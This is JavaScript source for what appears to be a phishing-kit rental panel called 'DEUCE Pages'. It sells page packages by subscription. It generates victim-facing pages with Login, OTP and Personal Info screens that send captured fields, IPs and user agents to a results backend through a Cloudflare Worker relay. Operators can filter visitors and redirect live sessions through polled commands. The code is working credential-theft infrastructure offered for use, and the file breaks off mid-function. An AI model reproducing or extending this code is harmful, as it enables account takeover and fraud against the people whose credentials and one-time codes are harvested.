const templates = [
  {
    id: "blackbox-template",
    name: "Blackbox Launch",
    description: "Private access page for tools, drops, and closed communities.",
    status: "BLACKBOX SESSION ACTIVE"
  },
  {
    id: "command-template",
    name: "Command Layer",
    description: "Premium security operations dashboard and telemetry view.",
    status: "OVERWATCH FEEDS SYNCHRONIZED"
  },
  {
    id: "vault-template",
    name: "Vault Identity",
    description: "Technical portfolio card for high-signal builders.",
    status: "IDENTITY VAULT MASKED"
  }
];

const templateList = document.querySelector("#templateList");
const preview = document.querySelector("#preview");
const statusText = document.querySelector("#statusText");
const copyButton = document.querySelector("#copyButton");
const randomButton = document.querySelector("#randomButton");
const swatches = document.querySelector("#swatches");
const themeToggle = document.querySelector("#themeToggle");
const topbarTitle = document.querySelector("#topbarTitle");
const appShell = document.querySelector(".app-shell");
const matrix = document.querySelector("#matrix");
const context = matrix.getContext("2d");
let activeTemplate = templates[0];

let marketPages = [];
let adminPackages = [];

const packageDataModel = {
  identity: ["id", "slug", "name", "type", "status", "version"],
  billing: ["billingPeriods.daily", "billingPeriods.weekly", "billingPeriods.biweekly", "billingPeriods.monthly"],
  source: ["sourceType", "repo", "screens", "assets", "cssFiles", "inlineCssBlocks"],
  design: ["tokens.brand", "tokens.font", "tokens.radius", "cssMode", "design"],
  audit: ["createdAt", "updatedAt"]
};

const userPageConfigModel = {
  identity: ["id", "userId", "packageId", "packageVersion", "status"],
  subscription: ["billingPeriod", "renewalPrice", "renewalDate", "autoRenew", "walletSource"],
  routing: ["domain", "allowedDomains", "generatedFile.version", "generatedFile.lastGeneratedAt"],
  hosting: ["hostingConfig.domain", "hostingConfig.serverIp", "hostingConfig.hostingType", "hostingConfig.installPath", "hostingConfig.verified"],
  flow: ["flow", "configs", "screenOrder", "disabledScreens"],
  security: ["captcha", "bannedIps", "whitelistIps", "trafficLog"],
  results: ["results", "resultSettings.webhook", "resultSettings.retentionDays", "resultSettings.notifyOnResult"]
};

let adminUsers = [];
let ownedPages = [];
let walletData = { balance: 0, currency: "USD", transactions: [] };
const selectedMarketPlans = {};
const billingPeriodLabels = {
  daily: "Daily",
  weekly: "Weekly",
  biweekly: "Biweekly",
  monthly: "Monthly"
};

const screenLibrary = [
  {
    name: "Login",
    type: "Credential screen",
    fields: ["Email or username", "Password"],
    status: "Enabled"
  },
  {
    name: "OTP",
    type: "Verification screen",
    fields: ["6-digit code", "Resend timer"],
    status: "Enabled"
  },
  {
    name: "Personal Info",
    type: "Data collection screen",
    fields: ["Full name", "Phone", "Address"],
    status: "Enabled"
  },
  {
    name: "Success",
    type: "Completion screen",
    fields: ["Success message", "Redirect URL"],
    status: "Enabled"
  },
  {
    name: "Redirect",
    type: "Final route",
    fields: ["Destination URL", "Delay seconds"],
    status: "Optional"
  }
];

let activeFlowSlug = null;
let draggedScreenName = null;
let apiLoadError = "";
const appearanceStorageKey = "deuceAppearance";

function getAppearancePreference() {
  try {
    return JSON.parse(localStorage.getItem(appearanceStorageKey)) || {};
  } catch {
    return {};
  }
}

function saveAppearancePreference(nextPreference) {
  const current = getAppearancePreference();
  localStorage.setItem(appearanceStorageKey, JSON.stringify({ ...current, ...nextPreference }));
}

function setThemeMode(theme, persist = false) {
  const nextTheme = theme === "light" ? "light" : "dark";
  const isLight = nextTheme === "light";
  document.documentElement.dataset.theme = nextTheme;
  themeToggle?.setAttribute("aria-label", isLight ? "Switch to dark theme" : "Switch to light theme");
  if (themeToggle) {
    themeToggle.innerHTML = isLight
      ? '<span aria-hidden="true">&#9728;</span><strong>Light Mode</strong>'
      : '<span aria-hidden="true">&#127769;</span><strong>Dark Mode</strong>';
  }
  if (persist) saveAppearancePreference({ theme: nextTheme });
}

function setAccentColor(accent, persist = false) {
  const nextAccent = accent || "#7CFFB2";
  document.documentElement.style.setProperty("--accent", nextAccent);
  document.documentElement.style.setProperty("--line", `${nextAccent}33`);
  document.querySelectorAll(".swatch").forEach((item) => {
    item.classList.toggle("active", item.dataset.accent?.toLowerCase() === nextAccent.toLowerCase());
  });
  if (persist) saveAppearancePreference({ accent: nextAccent });
}

function applyAppearancePreference() {
  const preference = getAppearancePreference();
  setThemeMode(preference.theme || document.documentElement.dataset.theme || "dark");
  setAccentColor(preference.accent || "#7CFFB2");
}

async function saveFlowState(page) {
  try {
    await requestApi(`/api/user-pages/${page.id}/config`, {
      method: "PATCH",
      body: JSON.stringify({
        domain: page.domain,
        flow: page.flow,
        configs: page.configs || {},
        securityConfig: page.securityConfig || {},
        subscription: page.subscription || {},
        generatedFile: page.generatedFile || {},
        resultSettings: page.resultSettings || {},
        hostingConfig: page.hostingConfig || {}
      })
    });
  } catch (error) {
    statusText.textContent = `SAVE FAILED: ${error.message}`.toUpperCase();
  }
}

function getPageBySlug(pageSlug) {
  return ownedPages.find((item) => item.slug === pageSlug || item.id === pageSlug) || null;
}

function renderMissingPage() {
  activeFlowSlug = null;
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>record not found</small>
        <h2>Page is not available</h2>
        <p>This page must come from a real subscription record before it can be configured.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "My Pages", "primary"),
        routeButton("#pages", "Browse pages"),
        ...(isAdmin() ? [routeButton("#admin", "Admin")] : [])
      ])}
      ${emptyState("No page record loaded", "Connect the API/database or subscribe to a page package first.", "#pages")}
    </section>
  `;
  statusText.textContent = "PAGE RECORD REQUIRED";
  topbarTitle.textContent = "Page Required";
}

function getScreenConfig(page, screenName) {
  return {
    title: `${screenName} Page`,
    buttonText: screenName === "Success" || screenName === "Redirect" ? "Continue" : "Next",
    redirectUrl: "",
    fields: screenLibrary.find((screen) => screen.name === screenName)?.fields.join(", ") || "",
    ...(page.configs?.[screenName] || {})
  };
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function routeButton(hash, label, variant = "") {
  return `<button type="button" class="${variant}" data-route="${hash}">${label}</button>`;
}

function viewNav(buttons) {
  return `<nav class="view-nav" aria-label="Page navigation">${buttons.join("")}</nav>`;
}

function apiBase() {
  const isFile = window.location.protocol === "file:";
  return isFile ? "http://localhost:10000" : window.location.origin;
}

async function requestApi(path, options = {}) {
  const auth = getAuthState();
  const authHeaders = auth.token ? { Authorization: `Bearer ${auth.token}` } : {};
  let response;
  try {
    response = await fetch(`${apiBase()}${path}`, {
      headers: { "Content-Type": "application/json", ...authHeaders, ...(options.headers || {}) },
      ...options
    });
  } catch (error) {
    const apiError = new Error(`API connection failed at ${apiBase()}${path}`);
    apiError.status = 0;
    apiError.cause = error;
    throw apiError;
  }
  const data = await response.json().catch(() => ({}));
  if (!response.ok) {
    const error = new Error(data.error || `API request failed: ${response.status}`);
    error.status = response.status;
    error.data = data;
    throw error;
  }
  return data;
}

async function checkAdminApiConnection() {
  let health;
  try {
    health = await requestApi("/api/health");
  } catch (error) {
    return {
      ok: false,
      status: error.status || 0,
      title: "API connection failed",
      detail: `The app could not reach ${apiBase()}/api/health. Check Render deploy status, API_BASE_URL/CORS_ORIGINS, and that the web service is awake.`
    };
  }

  try {
    const session = await requestApi("/api/auth/me");
    if (String(session.user?.role || "").toLowerCase() !== "admin") {
      return {
        ok: false,
        status: 403,
        title: "Admin access required",
        detail: "GitHub import is an admin action. Log in with an email listed in ADMIN_EMAILS on Render, then refresh and try again."
      };
    }
    return { ok: true, health, user: session.user };
  } catch (error) {
    return {
      ok: false,
      status: error.status || 0,
      title: error.status === 401 ? "Login required" : "Admin session check failed",
      detail: error.status === 401
        ? "Log in first, then open Admin > Import > GitHub again."
        : error.message
    };
  }
}

function formatMoney(value) {
  return `$${Number(value || 0).toFixed(2).replace(/\.00$/, "")}`;
}

function billingPrice(pagePackage, period) {
  const billing = pagePackage.billingPeriods || {};
  return Number(billing[period] || billing.weekly || 25);
}

function billingLabel(period) {
  return billingPeriodLabels[period] || period;
}

function selectedBillingPeriod(pagePackage) {
  return selectedMarketPlans[pagePackage.slug] || "weekly";
}

function billingOptionLabel(pagePackage, period) {
  return `${billingLabel(period)} - ${formatMoney(billingPrice(pagePackage, period))}`;
}

function marketPriceLabel(pagePackage, period) {
  return isAdmin() ? `${billingLabel(period)} - Admin free` : billingOptionLabel(pagePackage, period);
}

function marketSubscribeLabel(pagePackage, period) {
  return isAdmin() ? "Activate free" : `Subscribe - ${formatMoney(billingPrice(pagePackage, period))}`;
}

function findPackageThumbnail(pagePackage) {
  const files = [
    ...(pagePackage.packageManifest?.files || []).map((file) => file.path || file),
    ...(pagePackage.assets || [])
  ].filter(Boolean);
  const preferred = [
    /(^|\/)favicon\.(ico|png|svg|webp)$/i,
    /(^|\/)apple-touch-icon\.(png|webp)$/i,
    /(^|\/)(site-)?logo\.(png|jpe?g|svg|webp)$/i,
    /(^|\/).*icon.*\.(png|svg|webp|ico)$/i,
    /(^|\/).*logo.*\.(png|jpe?g|svg|webp)$/i
  ];
  for (const pattern of preferred) {
    const match = files.find((file) => pattern.test(String(file)));
    if (match) return String(match);
  }
  return "";
}

function normalizePackage(pagePackage) {
  const billing = pagePackage.billingPeriods || {};
  const weekly = Number(billing.weekly || 25);
  const manifestScreens = pagePackage.packageManifest?.screens || [];
  const previewFile = manifestScreens.find((screen) => screen.role === "entry")?.file
    || manifestScreens[0]?.file
    || "";
  const cleanDescription = pagePackage.packageManifest?.description || "Ready to preview and subscribe.";
  return {
    ...pagePackage,
    billingPeriods: {
      daily: Number(billing.daily || Math.ceil(weekly / 5)),
      weekly,
      biweekly: Number(billing.biweekly || weekly * 2),
      monthly: Number(billing.monthly || weekly * 4)
    },
    type: pagePackage.packageManifest?.type || pagePackage.sourceType || "Page package",
    weeklyPrice: `${formatMoney(weekly)}/week`,
    prices: [
      `Daily ${formatMoney(billing.daily || Math.ceil(weekly / 5))}`,
      `Weekly ${formatMoney(weekly)}`,
      `Biweekly ${formatMoney(billing.biweekly || weekly * 2)}`,
      `Monthly ${formatMoney(billing.monthly || weekly * 4)}`
    ],
    description: cleanDescription,
    userSummary: cleanDescription,
    stats: [],
    source: pagePackage.sourceType === "github" ? "GitHub repo" : "Uploaded bundle",
    repo: pagePackage.repoUrl || "",
    cssMode: "",
    design: pagePackage.status || "Draft",
    price: `${formatMoney(weekly)}/week`,
    tokens: pagePackage.designTokens || {},
    inlineCssBlocks: pagePackage.packageManifest?.inlineCssBlocks || 0,
    previewFile,
    thumbnailPath: findPackageThumbnail(pagePackage),
    previewReady: Boolean(pagePackage.packageManifest?.github && previewFile && pagePackage.previewToken)
  };
}

function normalizeUserPage(page) {
  const results = page.results || [];
  return {
    ...page,
    status: page.status || "active",
    traffic: page.traffic || "0 views",
    security: page.securityConfig?.captcha ? "Captcha on" : "Security ready",
    flow: page.flow || [],
    configs: page.configs || {},
    results,
    subscription: page.subscription || {},
    generatedFile: page.generatedFile || {},
    resultSettings: page.resultSettings || {},
    hostingConfig: page.hostingConfig || {},
    securityConfig: page.securityConfig || { domains: [], captcha: false, turnstile: { siteKey: "", secretKey: "" }, bannedIps: [], whitelistIps: [], trafficLog: [] }
  };
}

function normalizePageResult(result) {
  const createdAt = result.createdAt || result.date || new Date().toISOString();
  const date = new Date(createdAt);
  const payload = result.payload || result.fields || {};
  return {
    ...result,
    status: result.status || "New",
    screen: result.screen || result.pageId || "Page",
    fields: payload,
    ip: result.ip || "unknown",
    date: Number.isNaN(date.getTime()) ? "--" : date.toLocaleDateString(),
    time: Number.isNaN(date.getTime()) ? "--" : date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
  };
}

async function loadResultsControlData(page) {
  try {
    const [resultsData, sessionsData] = await Promise.all([
      requestApi(`/api/user-pages/${page.id}/results`),
      requestApi(`/api/user-pages/${page.id}/sessions`)
    ]);
    const results = (resultsData.results || []).map(normalizePageResult);
    page.results = results;
    page.activeSessions = sessionsData.sessions || [];
    ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, results, activeSessions: page.activeSessions } : item);
  } catch (error) {
    statusText.textContent = `RESULTS LOAD WARNING: ${error.message}`.toUpperCase();
  }
  return page;
}

async function loadAppData() {
  apiLoadError = "";
  try {
    const auth = getAuthState();
    const packagesResult = await requestApi("/api/packages");
    const [userPagesResult, walletResult] = auth.token
      ? await Promise.all([
        requestApi("/api/user-pages"),
        requestApi("/api/wallet")
      ])
      : [{ userPages: [] }, { balance: 0, currency: "USD", transactions: [] }];
    const packages = packagesResult.packages || [];
    marketPages = packages.filter((pagePackage) => pagePackage.status === "published").map(normalizePackage);
    adminPackages = packages.map(normalizePackage);
    ownedPages = (userPagesResult.userPages || []).map(normalizeUserPage);
    walletData = walletResult || { balance: 0, currency: "USD", transactions: [] };
  } catch (error) {
    apiLoadError = error.message;
    marketPages = [];
    adminPackages = [];
    ownedPages = [];
    adminUsers = [];
    walletData = { balance: 0, currency: "USD", transactions: [] };
  }
}

function emptyState(title, copy, actionHash = "") {
  return `
    <article class="empty-state">
      <h3>${title}</h3>
      <p>${copy}</p>
      ${apiLoadError ? `<small>API: ${escapeHtml(apiLoadError)}</small>` : ""}
      ${actionHash ? routeButton(actionHash, "Open setup") : ""}
    </article>
  `;
}

function getAuthState() {
  try {
    return JSON.parse(localStorage.getItem("deuceAuthState")) || { mode: "guest", user: null, token: null };
  } catch {
    return { mode: "guest", user: null, token: null };
  }
}

function saveAuthState(nextState) {
  localStorage.setItem("deuceAuthState", JSON.stringify(nextState));
  syncAdminVisibility();
}

function clearAuthState() {
  localStorage.removeItem("deuceAuthState");
  marketPages = [];
  adminPackages = [];
  adminUsers = [];
  ownedPages = [];
  walletData = { balance: 0, currency: "USD", transactions: [] };
  syncAdminVisibility();
}

function isLoggedIn() {
  return Boolean(getAuthState().token);
}

function isAdmin() {
  return String(getAuthState().user?.role || "").toLowerCase() === "admin";
}

function isAdminRoute(hash) {
  return hash === "#admin" || hash.startsWith("#admin-");
}

function syncAdminVisibility() {
  const adminNav = document.querySelector('.nav-item[href="#admin"]');
  const auth = getAuthState();
  const allowed = isAdmin();
  if (adminNav) {
    adminNav.hidden = !allowed;
    adminNav.classList.toggle("is-hidden", !allowed);
    adminNav.style.display = allowed ? "" : "none";
    adminNav.setAttribute("aria-hidden", allowed ? "false" : "true");
    adminNav.tabIndex = allowed ? 0 : -1;
  }
  const displayName = auth.user?.name || (allowed ? "Deuce Admin" : "Deuce User");
  const roleLabel = allowed ? "Admin account" : "Subscriber account";
  const profileName = document.getElementById("profileName");
  const dropdownProfileName = document.getElementById("dropdownProfileName");
  const profileRole = document.getElementById("profileRole");
  if (profileName) profileName.textContent = displayName;
  if (dropdownProfileName) dropdownProfileName.textContent = displayName;
  if (profileRole) profileRole.textContent = roleLabel;
}

function authField(name) {
  return preview.querySelector(`[data-auth-field="${name}"]`)?.value.trim() || "";
}

function setAuthLayout(enabled) {
  appShell?.classList.toggle("auth-mode", enabled);
}

async function refreshAuthUser() {
  const auth = getAuthState();
  if (!auth.token) return;
  try {
    const result = await requestApi("/api/auth/me");
    saveAuthState({ ...auth, user: result.user });
  } catch (error) {
    if (error.status === 401) clearAuthState();
  }
}

function generateRelaySecret() {
  const bytes = new Uint8Array(24);
  if (window.crypto?.getRandomValues) {
    window.crypto.getRandomValues(bytes);
    return `deuce_${Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")}`;
  }
  return `deuce_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 18)}`;
}

function cloudflareWorkerScript(page) {
  const hosting = page.hostingConfig || {};
  const backendApi = (hosting.relayTarget || apiBase()).replace(/\/$/, "");
  const relaySecret = hosting.relaySecret || "";
  return `const DEUCE_API = "${backendApi}";
const RELAY_SECRET = "${relaySecret}";

addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  if (url.pathname.endsWith("/index.html")) {
    url.pathname = url.pathname.replace(/index\\.html$/, "");
    return Response.redirect(url.toString(), 301);
  }

  if (!url.pathname.startsWith("/api/")) {
    return fetch(request);
  }

  const target = new URL(DEUCE_API);
  target.pathname = "/api/runtime" + url.pathname.replace(/^\\/api/, "");
  target.search = url.search;

  const headers = new Headers(request.headers);
  headers.set("x-deuce-relay-secret", RELAY_SECRET);
  headers.set("x-deuce-client-host", url.hostname);

  return fetch(target.toString(), {
    method: request.method,
    headers,
    body: request.method === "GET" || request.method === "HEAD" ? undefined : request.body
  });
}`;
}

function hostingTypeOptions(selectedType = "render-static-site") {
  return [
    ["render-static-site", "Render Static Site"],
    ["cpanel", "cPanel"],
    ["vps", "VPS"],
    ["shared-hosting", "Shared hosting"],
    ["custom-server", "Custom server"]
  ].map(([value, label]) => `<option value="${value}" ${selectedType === value ? "selected" : ""}>${label}</option>`).join("");
}

function hostingTypeLabel(value = "cpanel") {
  return {
    "render-static-site": "Render Static Site",
    cpanel: "cPanel",
    vps: "VPS",
    "shared-hosting": "Shared hosting",
    "custom-server": "Custom server"
  }[value] || value;
}

function setupStepClass(done, active = false) {
  if (done) return "done";
  return active ? "active" : "";
}

function packageForUserPage(page) {
  const packages = [...marketPages, ...adminPackages];
  return packages.find((pagePackage) => (
    pagePackage.id === page.packageId
    || pagePackage.slug === page.slug
    || pagePackage.slug === page.pageId
  )) || null;
}

function packageEntryFile(pagePackage) {
  const screens = pagePackage?.packageManifest?.screens || [];
  return screens.find((screen) => screen.role === "entry")?.file || screens[0]?.file || "";
}

function shouldUsePackageRuntime(page, pagePackage) {
  return Boolean(
    pagePackage?.sourceType === "github"
    && pagePackage?.packageManifest?.github
    && packageEntryFile(pagePackage)
    && (page.hostingConfig?.connectionType || "cloudflare-worker") === "cloudflare-worker"
  );
}

function createPackageRuntimeIndex(page, pagePackage) {
  const serverApiBase = page.generatedFile?.apiBase || "https://your-render-app.onrender.com";
  const hostingConfig = page.hostingConfig || {};
  const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
  const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
  const liveDomain = hostingConfig.domain || page.domain || "";
  const strictAllowedDomains = [liveDomain].filter(Boolean);
  const entryFile = packageEntryFile(pagePackage);
  const payload = {
    id: page.id,
    userId: page.userId,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    pageId: page.slug,
    pageName: page.name,
    source: {
      type: pagePackage.sourceType,
      entryFile,
      screens: pagePackage.packageManifest?.screens || []
    },
    apiBase: runtimeApiBase,
    generatedAt: new Date().toISOString(),
    domain: liveDomain,
    hosting: hostingConfig,
    allowedDomains: strictAllowedDomains,
    subscription: page.subscription,
    resultSettings: page.resultSettings,
    security: {
      ...(page.securityConfig || {}),
      turnstile: {
        enabled: Boolean(page.securityConfig?.captcha),
        provider: "turnstile",
        siteKey: page.securityConfig?.turnstile?.siteKey || page.securityConfig?.turnstileSiteKey || ""
      }
    },
    generatedFile: page.generatedFile,
    runtime: {
      configEndpoint: `${runtimeApiBase}/config?userPageId=${encodeURIComponent(page.id)}`,
      sourceEndpoint: `${runtimeApiBase}/source?userPageId=${encodeURIComponent(page.id)}`
    }
  };
  delete payload.security.turnstileSecretKey;
  delete payload.security.secretKey;
  const configJson = JSON.stringify(payload, null, 8).replace(/<\//g, "<\\/");

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${escapeHtml(page.name)}</title>
    <style>
      * { box-sizing: border-box; }
      html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
      body { overflow: hidden; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; }
      #deuceBlock {
        min-height: 100vh;
        display: none;
        place-items: center;
        padding: 24px;
        color: #eef8f2;
        background: #050607;
      }
      #deuceBlock.active { display: grid; }
      #deuceBlock article {
        max-width: 520px;
        border: 1px solid rgba(124,255,178,.24);
        border-radius: 10px;
        padding: 28px;
        background: #0d1112;
      }
      #deuceBlock small { color: #7cffb2; font-weight: 800; text-transform: uppercase; }
      #deuceBlock h1 { margin: 10px 0; font-size: 1.7rem; }
      #deuceBlock p { color: #8da199; line-height: 1.55; }
    </style>
  </head>
  <body>
    <iframe id="deuceFrame" title="${escapeHtml(page.name)}"></iframe>
    <section id="deuceBlock">
      <article>
        <small>access blocked</small>
        <h1 id="deuceBlockTitle">Domain not authorized</h1>
        <p id="deuceBlockCopy">This generated page is not allowed to run on this domain.</p>
      </article>
    </section>
    <script>
      window.DEUCE_PAGE_CONFIG = ${configJson};
      const config = window.DEUCE_PAGE_CONFIG;
      const allowed = config.allowedDomains || [];
      const host = window.location.hostname;
      const frame = document.getElementById("deuceFrame");
      const block = document.getElementById("deuceBlock");
      const blockCopy = document.getElementById("deuceBlockCopy");

      function blockPage(message) {
        frame.remove();
        block.classList.add("active");
        blockCopy.textContent = message;
      }

      if (allowed.length && !allowed.includes(host)) {
        blockPage("This page is only configured for " + allowed.join(", ") + ".");
      } else {
        frame.src = config.runtime.sourceEndpoint;
      }
    <\/script>
  </body>
</html>`;
}

function createGeneratedIndex(page) {
  const pagePackage = packageForUserPage(page);
  if (shouldUsePackageRuntime(page, pagePackage)) {
    return createPackageRuntimeIndex(page, pagePackage);
  }

  const screens = page.flow.map((screenName) => {
    const screen = screenLibrary.find((item) => item.name === screenName);
    return {
      name: screenName,
      type: screen?.type || "Custom screen",
      config: getScreenConfig(page, screenName)
    };
  });
  const serverApiBase = page.generatedFile?.apiBase || "https://your-render-app.onrender.com";
  const securityConfig = page.securityConfig || {};
  const hostingConfig = page.hostingConfig || {};
  const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
  const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
  const liveDomain = hostingConfig.domain || page.domain || "";
  const strictAllowedDomains = [liveDomain].filter(Boolean);
  const publicSecurity = {
    ...securityConfig,
    turnstile: {
      enabled: Boolean(securityConfig.captcha),
      provider: "turnstile",
      siteKey: securityConfig.turnstile?.siteKey || securityConfig.turnstileSiteKey || ""
    }
  };
  delete publicSecurity.turnstileSecretKey;
  delete publicSecurity.secretKey;

  const payload = {
    id: page.id,
    userId: page.userId,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    pageId: page.slug,
    pageName: page.name,
    licenseKey: page.generatedFile?.licenseKey || `${page.id}_${page.packageVersion}`.replace(/[^a-z0-9_]/gi, "_"),
    apiBase: runtimeApiBase,
    generatedAt: new Date().toISOString(),
    domain: liveDomain,
    hosting: hostingConfig,
    allowedDomains: strictAllowedDomains,
    subscription: page.subscription,
    resultSettings: page.resultSettings,
    security: publicSecurity,
    generatedFile: page.generatedFile,
    runtime: {
      configEndpoint: `${runtimeApiBase}/config?userPageId=${encodeURIComponent(page.id)}`,
      resultEndpoint: `${runtimeApiBase}/results`,
      trafficEndpoint: `${runtimeApiBase}/traffic`,
      securityEndpoint: `${runtimeApiBase}/security/check`,
      commandEndpoint: `${runtimeApiBase}/session-command`,
      turnstileEndpoint: `${runtimeApiBase}/verify-human`
    },
    screens
  };
  const configJson = JSON.stringify(payload, null, 8).replace(/<\//g, "<\\/");

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${escapeHtml(page.name)}</title>
    <style>
      :root {
        color-scheme: dark;
        --bg: #050607;
        --panel: #0d1112;
        --text: #eef8f2;
        --muted: #8da199;
        --accent: #7cffb2;
        --line: rgba(124,255,178,.22);
        --danger: #ff4d8d;
        font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      }
      * { box-sizing: border-box; }
      body {
        min-height: 100vh;
        margin: 0;
        display: grid;
        place-items: center;
        padding: 24px;
        color: var(--text);
        background:
          linear-gradient(115deg, rgba(2,3,3,.98), rgba(7,10,11,.9)),
          repeating-linear-gradient(90deg, rgba(124,255,178,.08) 0 1px, transparent 1px 72px),
          var(--bg);
      }
      main {
        width: min(560px, 100%);
        border: 1px solid var(--line);
        border-radius: 10px;
        padding: clamp(22px, 6vw, 38px);
        background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.025)), var(--panel);
        box-shadow: 0 28px 90px rgba(0,0,0,.42);
      }
      small {
        color: var(--accent);
        font: 800 .72rem Consolas, monospace;
        text-transform: uppercase;
      }
      h1 { margin: 10px 0 10px; font-size: clamp(1.8rem, 8vw, 3rem); line-height: 1; }
      p { color: var(--muted); line-height: 1.65; }
      form { display: grid; gap: 12px; margin-top: 22px; }
      label { display: grid; gap: 6px; color: var(--muted); font-size: .82rem; }
      input, textarea, select {
        width: 100%;
        min-height: 44px;
        border: 1px solid rgba(255,255,255,.12);
        border-radius: 8px;
        padding: 0 12px;
        color: var(--text);
        background: rgba(255,255,255,.05);
      }
      textarea { min-height: 92px; padding: 12px; resize: vertical; }
      button {
        min-height: 46px;
        border: 1px solid var(--accent);
        border-radius: 8px;
        color: #02120a;
        background: var(--accent);
        font-weight: 900;
        cursor: pointer;
      }
      .meta {
        display: flex;
        justify-content: space-between;
        gap: 12px;
        margin-top: 18px;
        color: var(--muted);
        font: 800 .72rem Consolas, monospace;
      }
      .status {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
        margin-top: 18px;
      }
      .status span, .captcha-box {
        border: 1px solid rgba(255,255,255,.1);
        border-radius: 8px;
        padding: 8px 10px;
        color: var(--muted);
        background: rgba(255,255,255,.04);
        font: 800 .72rem Consolas, monospace;
      }
      .captcha-box { display: none; min-height: 74px; align-items: center; justify-content: center; }
      .captcha-box.active { display: flex; }
      .blocked {
        border-color: rgba(255,77,141,.48);
      }
      .blocked h1 { color: #ff8aae; }
      .hidden { display: none; }
    </style>
    ${publicSecurity.captcha && publicSecurity.turnstile.siteKey ? '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>' : ""}
  </head>
  <body>
    <main>
      <small id="stepLabel"></small>
      <h1 id="screenTitle"></h1>
      <p id="screenCopy"></p>
      <div class="status" id="runtimeStatus"></div>
      <form id="screenForm"></form>
      <div class="meta">
        <span id="pageName"></span>
        <span id="progress"></span>
      </div>
    </main>

    <script>
      window.DEUCE_PAGE_CONFIG = ${configJson};

      const config = window.DEUCE_PAGE_CONFIG;
      let currentStep = 0;
      const sessionData = {};
      const sessionId = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      let runtimeAllowed = true;
      let captchaPassed = !config.security?.captcha;
      let captchaToken = "";
      let captchaWidgetId = null;
      const pageName = document.querySelector("#pageName");
      const progress = document.querySelector("#progress");
      const stepLabel = document.querySelector("#stepLabel");
      const screenTitle = document.querySelector("#screenTitle");
      const screenCopy = document.querySelector("#screenCopy");
      const screenForm = document.querySelector("#screenForm");
      const runtimeStatus = document.querySelector("#runtimeStatus");

      pageName.textContent = config.pageName;

      function endpoint(path) {
        if (path.startsWith("http")) return path;
        return config.apiBase.replace(/\\/$/, "") + "/" + path.replace(/^\\//, "");
      }

      function setStatus(items) {
        runtimeStatus.innerHTML = items.map((item) => "<span>" + item + "<\\/span>").join("");
      }

      function blockPage(reason, detail) {
        runtimeAllowed = false;
        document.querySelector("main").classList.add("blocked");
        stepLabel.textContent = "access blocked";
        screenTitle.textContent = reason;
        screenCopy.textContent = detail;
        screenForm.innerHTML = "";
        progress.textContent = "blocked";
      }

      function enforceDomain() {
        const allowedDomains = config.allowedDomains || config.security?.domains || [];
        const hostname = window.location.hostname;

        if (allowedDomains.length && !allowedDomains.includes(hostname)) {
          blockPage("Domain not authorized", "This page is not allowed to run on " + hostname + ". Update the domain allowlist inside DEUCE Pages.");
          return false;
        }
        return true;
      }

      async function checkRemoteSecurity(eventName) {
        const payload = {
          pageId: config.pageId,
          userPageId: config.id,
          userId: config.userId,
          licenseKey: config.licenseKey,
          packageId: config.packageId,
          packageVersion: config.packageVersion,
          hostname: window.location.hostname,
          sessionId,
          event: eventName,
          createdAt: new Date().toISOString()
        };

        try {
          const response = await fetch(config.runtime.securityEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          });
          if (!response.ok) return true;
          const decision = await response.json();
          if (decision.allowed === false) {
            blockPage("Security rule blocked this visit", decision.reason || "This visit was blocked by your DEUCE Pages security settings.");
            return false;
          }
          return true;
        } catch (error) {
          console.info("DEUCE Pages security check queued for Render API", payload);
          return true;
        }
      }

      function trackTraffic(eventName, extra = {}) {
        const payload = {
          pageId: config.pageId,
          userPageId: config.id,
          userId: config.userId,
          licenseKey: config.licenseKey,
          sessionId,
          hostname: window.location.hostname,
          path: window.location.pathname,
          event: eventName,
          screen: config.screens[currentStep]?.name || null,
          userAgent: navigator.userAgent,
          createdAt: new Date().toISOString(),
          ...extra
        };

        fetch(config.runtime.trafficEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {
          console.info("DEUCE Pages traffic payload queued for Render API", payload);
        });
      }

      function checkSessionCommand() {
        const commandUrl = config.runtime.commandEndpoint || endpoint("/api/runtime/session-command");
        const params = new URLSearchParams({ userPageId: config.id, sessionId });
        fetch(\`\${commandUrl}?\${params.toString()}\`)
          .then((response) => response.ok ? response.json() : null)
          .then((data) => {
            const command = data && data.command;
            if (command && command.action === "redirect" && command.targetUrl) {
              window.location.href = command.targetUrl;
            }
          })
          .catch(() => {});
      }

      window.setInterval(checkSessionCommand, 4000);

      function fieldsFor(screen) {
        return String(screen.config.fields || "")
          .split(",")
          .map((field) => field.trim())
          .filter(Boolean);
      }

      function inputTypeFor(field) {
